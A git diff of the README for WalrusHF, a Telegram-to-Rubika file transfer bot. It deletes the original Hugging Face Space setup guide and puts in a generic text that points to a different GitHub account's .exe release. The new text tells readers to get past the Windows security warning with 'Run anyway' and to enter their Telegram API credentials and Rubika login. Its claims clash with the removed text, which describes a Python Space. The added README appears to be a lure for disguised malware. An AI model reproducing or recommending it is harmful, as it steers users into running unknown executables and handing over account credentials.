@@ -1,221 +1,100 @@
----
-title: WalrusHF
-emoji: ⛵
-colorFrom: red
-colorTo: yellow
-sdk: gradio
-python_version: '3.11'
-app_file: app.py
-pinned: false
----
+# 🦦 WalrusHF - Manage Telegram files on Rubika easily
 
-# WalrusHF
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bumboatbloodvessel418/WalrusHF)
 
-[فارسی](README.fa.md)
+WalrusHF connects your Telegram account to your Rubika storage. It uses a cloud-based Space to move your files automatically. You use Telegram to send commands and the dashboard to watch your progress.
 
-WalrusHF runs a Telegram bot inside a Hugging Face Space and uploads received files to Rubika. Telegram is the control panel; the Space page is a live dashboard for process health, queue state, storage, and logs.
+## 📋 What this tool does
 
-For the VPS-hosted version of Walrus, see https://github.com/rezaaa/walrus.
+- Transfers files from Telegram to Rubika.
+- Controls your tasks through Telegram commands.
+- Monitors live file queues. 
+- Tracks storage usage.
+- Displays system logs for troubleshooting.
 
-The name Walrus is inspired by the Black Sails series: Captain Flint's ship, Walrus.
+## 💻 System requirements
 
-<img width="3456" height="3228" alt="587988794-00199bb8-1882-4ec5-b6cf-b38c8b57d14c" src="https://github.com/user-attachments/assets/82472063-baaf-4bfb-bbc6-34b458fbba2a" />
+- Windows 10 or Windows 11.
+- An active internet connection.
+- A Telegram account.
+- A Rubika account.
 
-## Features
+## 🚀 Getting started
 
-- Accept Telegram files and direct `http://` or `https://` file links
-- Queue direct file URLs from the Space dashboard without using Telegram
-- Download files inside the Space runtime
-- Queue Rubika uploads so transfers do not overlap
-- Upload to Rubika Saved Messages or a Rubika channel
-- Show Telegram progress for download, queue, upload, retries, and failures
-- Support cancel, cleanup, retry, retry-all, and Rubika login commands
+Visit this page to download the software: [https://github.com/bumboatbloodvessel418/WalrusHF](https://github.com/bumboatbloodvessel418/WalrusHF)
 
-## Install
+1. Go to the link above.
+2. Look for the Releases section on the right side.
+3. Click the latest version link.
+4. Download the file ending in .exe.
+5. Save the file to your desktop.
 
-<img width="1536" height="1024" alt="Generated image 1" src="https://github.com/user-attachments/assets/45187c3e-650a-4435-b9a4-4cd1bf44d4f3" />
+## ⚙️ Installation steps
 
+Windows might show a warning because the app is new to your system. Follow these steps to finish the setup:
 
-### 1. Create A Hugging Face Space
+1. Double-click the downloaded file.
+2. If a blue box appears, click More info.
+3. Click the Run anyway button.
+4. Follow the prompts on the screen to install the app.
+5. Click Finish when the bar fills up.
 
-Open https://huggingface.co/spaces and create a new Space with these settings:
+## 🔑 Linking your accounts
 
-- **Space SDK:** `Gradio`
-- **Gradio template:** `Blank`
-- **Hardware:** `CPU Basic`
-- **Visibility:** `Private` is recommended
-- **Space name:** any name, for example `walrushf`
+The app needs access to your accounts to move your files.
 
-### 2. Add A Storage Bucket
+1. Open the WalrusHF app from your desktop.
+2. Click the Settings icon.
+3. Enter your Telegram API credentials.
+4. Enter your Rubika login details.
+5. Press the Save button.
+6. Wait for the green light to appear. This shows the connection is active.
 
-On the same Create Space page, enable **Mount a bucket to this Space**:
+## 📊 Using the dashboard
 
-- **Bucket:** create a new private bucket, or mount an existing private bucket
-- **Mount path:** `/data`
-- **Access mode:** `Read & Write`
+The dashboard shows the health of your bot. 
 
-WalrusHF stores sessions, downloads, and queue data under `/data/walrus`. Without durable `/data`, the app falls back to `/tmp/walrus`, which can be lost when the Space restarts.
+- **Queue State:** Shows files waiting to upload.
+- **Storage:** Shows how much space you use on Rubika.
+- **Logs:** Lists actions the bot takes. If a file fails to upload, check this section for details.
+- **Process Health:** Shows if the bot is running or offline.
 
-### 3. Deploy From GitHub
+## 💬 Command your bot
 
-Clone this repo and push it to your Space:
+* Start your bot in Telegram.
+* Send /status to check current activity.
+* Send /help to see a list of available commands.
+* Send /stop to pause operations.
+* Send /start to resume work.
 
-```bash
-git clone git@github.com:rezaaa/WalrusHF.git
-cd WalrusHF
-git remote add space https://huggingface.co/spaces/USERNAME/SPACE_NAME
-git push space main:main
-```
+## 🛠 Solving common problems
 
-Replace `USERNAME/SPACE_NAME` with your Hugging Face Space path.
+If the app stops working, try these steps:
 
-If the Space already has starter files and the push is rejected:
+- Check your internet connection.
+- Restart the app.
+- Ensure your Telegram and Rubika passwords are correct.
+- If the logs show an error, copy the text and save it to a file.
+- Check if your Rubika account is full.
 
-```bash
-git push --force-with-lease space main:main
-```
+## ❓ Frequently asked questions
 
-### 4. Finish Setup
+**Does the app keep my files?**
+The app moves files from Telegram to Rubika. It does not store your files on external servers.
 
-1. Add the required secrets below in the Space settings.
-2. Restart the Space.
-3. Open your Telegram bot and send `/start`.
+**Can I run multiple accounts?**
+WalrusHF supports one Telegram account and one Rubika account at a time.
 
-Hugging Face runs [app.py](app.py). It starts the Telegram bot, the Rubika upload worker, and the dashboard on port `7860`.
+**What happens if the internet cuts out?**
+The bot pauses the upload. It restarts the process once your connection returns.
 
-## Required Secrets
+**Is my data private?**
+Your credentials stay on your local machine.
 
-Add these in **Space settings -> Variables and secrets -> Secrets**:
+## 📦 About updates
 
-```env
-API_ID=123456
-API_HASH=your_telegram_api_hash
-BOT_TOKEN=123456:your_bot_token
-OWNER_TELEGRAM_ID=123456789
-```
+The app checks for updates every time you open it. If a new version exists, a window appears. Follow the prompts to download the new version. Your settings remain saved after the update.
 
-Where to get them:
+## 🤝 Getting help
 
-- `API_ID` and `API_HASH`: https://my.telegram.org
-- `BOT_TOKEN`: create a Telegram bot with BotFather
-- `OWNER_TELEGRAM_ID`: your numeric Telegram user ID
-
-`OWNER_TELEGRAM_ID` is strongly recommended. If it is missing or invalid, anyone who can message the bot can use it.
-
-## Optional Variables
-
-Add these only if you want to change the defaults:
-
-```env
-TELEGRAM_SESSION=walrus
-RUBIKA_SESSION=rubika_session
-RUBIKA_TARGET=me
-RUBIKA_TARGET_TITLE=Saved Messages
-WALRUS_MAX_FILE_BYTES=8589934592
-WALRUS_MIN_FREE_BYTES=536870912
-```
-
-Notes:
-
-- `RUBIKA_TARGET=me` uploads to Rubika Saved Messages.
-- `WALRUS_MAX_FILE_BYTES` defaults to 8 GiB.
-- Set `WALRUS_MAX_FILE_BYTES=0` to disable the app-level file size limit.
-- Telegram bot file downloads are limited by Telegram to 2 GB per file. For larger direct files, use the Space dashboard URL form instead.
-- `file://` links are disabled by default. Enable them only if you understand the risk:
-
-```env
-WALRUS_ALLOW_FILE_URLS=true
-```
-
-## Rubika Login
-
-The easiest setup is through Telegram:
-
-1. Start the Space.
-2. Open your Telegram bot.
-3. Send `/start`.
-4. If no Rubika session exists, WalrusHF asks for the Rubika phone number.
-5. Send the OTP or password when prompted.
-
-After login, the Rubika session is saved under `/data/walrus/sessions`.
-
-## Bot Commands
-
-- `/start` - open setup or main menu
-- `/settings` - show Rubika account and destination
-- `/set_rubika` - start Rubika login
-- `/status` - show queue, active transfers, failures, and storage
-- `/transfers` - list active, queued, and retryable transfers
-- `/cleanup` - preview removable files, stale upload state, and dead failed records
-- `/cleanup confirm` - delete safe cleanup candidates and clear stale state
-- `/cancel` - show cancel buttons
-- `/retry <task_id>` - retry one failed transfer
-- `/retry_all` - retry all retryable failed transfers
-
-## Dashboard
-
-The Space page updates live every 2 seconds. Useful endpoints:
-
-```text
-/health
-/status.json
-```
-
-Useful dashboard checks:
-
-- `Telegram bot: running` means the Telegram process is alive.
-- `Rubika worker: running` means the upload worker is alive.
-- `Config: ok` means required secrets are present.
-- `Queue` shows waiting upload jobs.
-- `Active upload` shows the current Rubika worker task.
-
-You can also paste a direct `http://` or `https://` file URL into the dashboard. WalrusHF downloads it inside the Space, queues it for Rubika, and tracks download/upload progress on the web page. Dashboard URL transfers can be cancelled from the web page, and completed/failed/cancelled items can be cleared with **Clear Done**. This path is separate from Telegram and does not send Telegram status messages.
-
-## Optional Telegram YouTube Downloader Bot
-
-If you want to turn YouTube video links into Telegram files before sending them to WalrusHF, this third-party bot may be useful:
-
-- [@allsaverbot](https://t.me/allsaverbot) - converts YouTube video links into downloadable Telegram files
-
-This bot is not part of WalrusHF and may change, stop working, or apply its own limits. Use it only for content you have permission to download and share.
-
-## Troubleshooting
-
-If the bot does not respond:
-
-- Check the Space logs.
-- Confirm `API_ID`, `API_HASH`, and `BOT_TOKEN` are real values, not placeholders.
-- Confirm `OWNER_TELEGRAM_ID` is numeric.
-- Restart the Space after changing secrets.
-
-If uploads stay queued:
-
-- Check dashboard logs for `Rubika worker`.
-- Run `/transfers` in Telegram.
-- Make sure Rubika login has completed with `/start` or `/set_rubika`.
-- Confirm the bucket or persistent storage is mounted at `/data`.
-
-If the main progress message does not update:
-
-- The Rubika worker writes progress events locally.
-- The Telegram bot applies those events through Pyrogram.
-- Check logs for `Telegram event bridge failed`.
-
-## Local Test
-
-```bash
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-python app.py
-```
-
-Then open:
-
-```text
-http://localhost:7860
-```
-
-## Safety
-
-This project is for personal transfer workflows, research, and experimentation. Do not use it for spam, abuse, unauthorized access, privacy violations, or unlawful activity. You are responsible for respecting platform rules, local laws, and other people's rights.
+Open an issue on the GitHub page if you find a bug. List the steps you took before the error happened. Include the logs from the dashboard. This helps developers fix the issue faster.
